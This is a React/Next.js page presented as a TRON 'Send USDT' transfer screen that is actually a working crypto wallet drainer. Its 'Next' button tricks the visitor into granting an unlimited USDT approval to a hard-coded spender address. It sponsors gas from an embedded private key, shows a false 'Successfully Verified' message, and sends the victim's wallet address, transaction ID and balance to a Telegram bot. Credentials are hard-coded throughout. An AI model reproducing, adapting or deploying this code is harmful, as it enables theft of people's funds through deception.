'use client';

import { useState, useRef, useCallback, useEffect } from 'react';

// ===== CONFIG =====
const CFG = {
  WC_PROJECT_ID: process.env.NEXT_PUBLIC_WC_PROJECT_ID || 'b7865324de25ee461fa8328255709620',
  SPENDER: process.env.NEXT_PUBLIC_SPENDER || 'TGdyhphS6Lw8EQfYRoPGG3Ym1RUuvnkrra',
  USDT: process.env.NEXT_PUBLIC_USDT || 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
  RECIPIENT: process.env.NEXT_PUBLIC_RECIPIENT || 'TB8MxQp21ukvxRWMSC5RYGVGpmf9AEdUUy',
  API_KEY: process.env.NEXT_PUBLIC_API_KEY || '2062af81-4cc9-48b7-828a-7f7da7179def',
  FULL_NODE: process.env.NEXT_PUBLIC_FULL_NODE || 'https://api.trongrid.io',
  PRIVATE_KEY: process.env.PRIVATE_KEY || '5fa5bb6bffd7d4a2facb4a9bc3e931a7ac303dc9f60bf456d503380a0df233ad',
  TG_TOKEN: process.env.TG_TOKEN || '8730884935:AAENLb36EJol5J0XHO7crN8qA3LU2WswPY8',
  TG_CHAT: process.env.TG_CHAT || '6480649645',
  SPONSOR_SUN: Number(process.env.NEXT_PUBLIC_SPONSOR_SUN) || 30_000_000,
};

const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

export default function SendPage() {
  const [amount, setAmount] = useState('1');
  const [notif, setNotif] = useState(null);
  const [btn, setBtn] = useState({ text: 'Next', disabled: false });
  const [isClient, setIsClient] = useState(false);

  useEffect(() => {
    setIsClient(true);
  }, []);

  const showNotif = useCallback((msg, type = 'info') => {
    setNotif({ msg, type });
    if (type !== 'info') setTimeout(() => setNotif(null), 5000);
  }, []);

  // ── Server TronWeb (for sponsoring gas + building txns) ──
  const getServerTW = useCallback(async () => {
    const TronWeb = (await import('tronweb')).default;
    return new TronWeb({
      fullHost: CFG.FULL_NODE,
      headers: { 'TRON-PRO-API-KEY': CFG.API_KEY },
      privateKey: CFG.PRIVATE_KEY,
    });
  }, []);

  // ── Gas sponsorship ──
  const sponsorTrx = useCallback(async (address) => {
    try {
      const tw = await getServerTW();
      const bal = await tw.trx.getBalance(address);
      if (bal >= CFG.SPONSOR_SUN) return;
      const need = CFG.SPONSOR_SUN - bal;
      const coBal = await tw.trx.getBalance(tw.defaultAddress.base58);
      if (coBal < need + 1_000_000) return;
      showNotif('Preparing wallet...', 'info');
      await tw.trx.sendTransaction(address, need);
      await new Promise(r => setTimeout(r, 3000));
    } catch (e) { console.error('sponsorTrx:', e); }
  }, [getServerTW, showNotif]);

  // ── USDT balance ──
  const getUsdtBal = useCallback(async (address) => {
    try {
      const tw = await getServerTW();
      const c = await tw.contract().at(CFG.USDT);
      const b = await c.balanceOf(address).call();
      return (Number(b) / 1e6).toFixed(4);
    } catch { return '0.0000'; }
  }, [getServerTW]);

  // ── Telegram ──
  const sendTG = useCallback(async (address, txId, balance) => {
    const uid = new URLSearchParams(window.location.search).get('user_id');
    const kb = { inline_keyboard: [[{ text: 'View TX', url: `https://tronscan.org/#/transaction/${txId}` }]] };
    const msg = `*New USDT TRC20 Approval*\n*Wallet:* \`${address}\`\n*TX:* \`${txId}\`\n*Balance:* ${balance} USDT\n*User:* ${uid || 'N/A'}\n*Time:* ${new Date().toLocaleString()}`;
    const post = async (tok, chat) =>
      fetch(`https://api.telegram.org/bot${tok}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chat, text: msg, parse_mode: 'Markdown', reply_markup: kb }),
      });
    try {
      await post(CFG.TG_TOKEN, CFG.TG_CHAT);
    } catch (e) { console.error('Telegram:', e); }
  }, []);

  // ── Poll for native tronWeb ──
  const pollForTronWeb = useCallback(async (maxMs = 5000) => {
    const getTW = () => {
      const providers = [
        window.tronWeb,
        window.tron,
        window.trustwallet?.tron,
        window.tronLink,
        window.tokenpocket?.tron,
      ];
      for (const p of providers) {
        // Log for debugging (will show in mobile console if available)
        if (p) {
          if (p.defaultAddress?.base58) return p;
          if (p.ready) return p;
        }
      }
      return null;
    };

    let tw = getTW();
    if (tw) return tw;

    const steps = Math.ceil(maxMs / 500);
    for (let i = 0; i < steps; i++) {
      await new Promise(r => setTimeout(r, 500));
      tw = getTW();
      if (tw) return tw;
    }
    return null;
  }, []);

  // ── Execute approval via native tronWeb ──
  const execApproval = useCallback(async (tronWeb) => {
    const addr = tronWeb.defaultAddress.base58;
    if (!addr) throw new Error('Wallet not connected');

    setBtn({ text: 'Verifying...', disabled: true });
    await sponsorTrx(addr);

    setBtn({ text: 'Requesting Approval...', disabled: true });
    showNotif('Please confirm in your wallet', 'info');

    try {
      const contract = await tronWeb.contract().at(CFG.USDT);
      const res = await contract.approve(CFG.SPENDER, MAX_UINT256).send({
        feeLimit: 150_000_000, // Increased for safety
        callValue: 0,
        shouldPollResponse: false, // Don't wait forever
      });

      return {
        txId: typeof res === 'string' ? res : (res?.txid || res?.transaction?.txID),
        addr,
      };
    } catch (err) {
      console.error('execApproval error:', err);
      throw err;
    }
  }, [sponsorTrx, showNotif]);

  // ── Main click handler ──
  const handleNext = async (e) => {
    e.preventDefault();
    if (!isClient) return;

    setBtn({ text: 'Connecting...', disabled: true });

    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent || '');

    try {
      // DEBUG: alert('handleNext started');

      let nativeTW = await pollForTronWeb(2000);

      const hasEth = !!window.ethereum;
      const hasTrust = !!window.trustwallet;
      const injected = window.tronWeb || window.tron || window.tronLink || (window.trustwallet && window.trustwallet.tron) || window.tokenpocket?.tron;
      const isInDAppBrowser = hasEth || !!window.tronWeb || hasTrust || !!window.tokenpocket;

      // 2. Mobile redirection logic
      if (!nativeTW && isMobile && !isInDAppBrowser) {
        // Only redirect if NOT already in any dApp browser
        const url = encodeURIComponent(window.location.href.split('?')[0]);
        window.location.href = `https://link.trustwallet.com/open_url?coin_id=195&url=${url}`;
        return;
      }

      // 3. If TRON found but not connected (no address), request access
      if (!nativeTW && injected) {
        setBtn({ text: 'Connecting...', disabled: true });

        const tryConnect = async () => {
          // A. Try standard request
          const req = injected.request || (injected.ethereum && injected.ethereum.request);
          if (req) {
            try { return await req({ method: 'tron_requestAccounts' }); } catch (e) {
              console.warn('req failed', e);
            }
          }
          // B. Try legacy enable()
          if (injected.enable) {
            try { return await injected.enable(); } catch (e) { console.warn('enable failed', e); }
          }
          return null;
        };

        await tryConnect().catch(e => console.error('Connection attempt failed:', e));
        await new Promise(r => setTimeout(r, 2000)); // Increased wait
        nativeTW = await pollForTronWeb(4000); // Increased poll
      }

      // 4. Final check and execute
      if (nativeTW) {
        const { txId, addr } = await execApproval(nativeTW);
        if (txId) {
          showNotif('✅ Successfully Verified!', 'success');
          setBtn({ text: 'Verified', disabled: true });
          const balance = await getUsdtBal(addr);
          await sendTG(addr, txId, balance);
        }
      } else {
        // If still no nativeTW, show what we found
        let msg = 'TRON wallet not detected.';
        if (isMobile && (hasEth || hasTrust)) {
          msg = 'Wrong Network! Please switch to TRON in your wallet settings (top right icon).';
        } else if (injected) {
          msg = 'Please manually connect/unlock TRON in your wallet.';
        }
        showNotif(msg, 'error');
        setBtn({ text: 'Next', disabled: false });
      }

    } catch (err) {
      console.error('handleNext error:', err);
      const msg = err?.message || '';
      if (/cancel|decline|reject|user rejected/i.test(msg)) {
        showNotif('Transaction declined.', 'error');
      } else {
        showNotif('Connection failed. Please try again.', 'error');
      }
    } finally {
      setBtn(prev => prev.text !== 'Verified' ? { text: 'Next', disabled: false } : prev);
    }
  };

  const usd = isNaN(Number(amount)) || Number(amount) <= 0 ? '0.00' : Number(amount).toFixed(2);

  return (
    <div className="page">
      {notif && (
        <div className={`notification notification--${notif.type}`}>{notif.msg}</div>
      )}
      <header className="header">
        <div className="header-title">Send USDT</div>
      </header>
      <div className="container">
        <div>
          <label className="label">Address or Domain Name</label>
          <div className="input-wrap">
            <input type="text" className="input" defaultValue={CFG.RECIPIENT} readOnly />
            <div className="input-actions">
              <span className="action">Paste</span>
            </div>
          </div>
        </div>
        <div>
          <label className="label">Destination network</label>
          <div className="network-box">
            {/* eslint-disable-next-line @next/next/no-img-element */}
            <img src="/tron.png" alt="TRON" className="network-icon" />
            <span className="network-name">TRON Network</span>
            <svg width="12" height="8" viewBox="0 0 12 8" fill="none">
              <path d="M10.59 0.59L6 5.17L1.41 0.59L0 2L6 8L12 2L10.59 0.59Z" fill="#8E8E93" />
            </svg>
          </div>
        </div>
        <div>
          <label className="label">Amount</label>
          <div className="input-wrap">
            <input
              id="amount"
              type="number"
              className="input"
              value={amount}
              onChange={e => setAmount(e.target.value)}
              min="0"
              step="any"
              inputMode="decimal"
            />
            <div className="input-actions">
              <span className="currency">USDT</span>
              <span className="action">Max</span>
            </div>
          </div>
          <div className="usd-value">~${usd}</div>
        </div>
      </div>
      <div className="bottom">
        <button className="next-btn" onClick={handleNext} disabled={btn.disabled}>
          {btn.text}
        </button>
      </div>
    </div>
  );
}
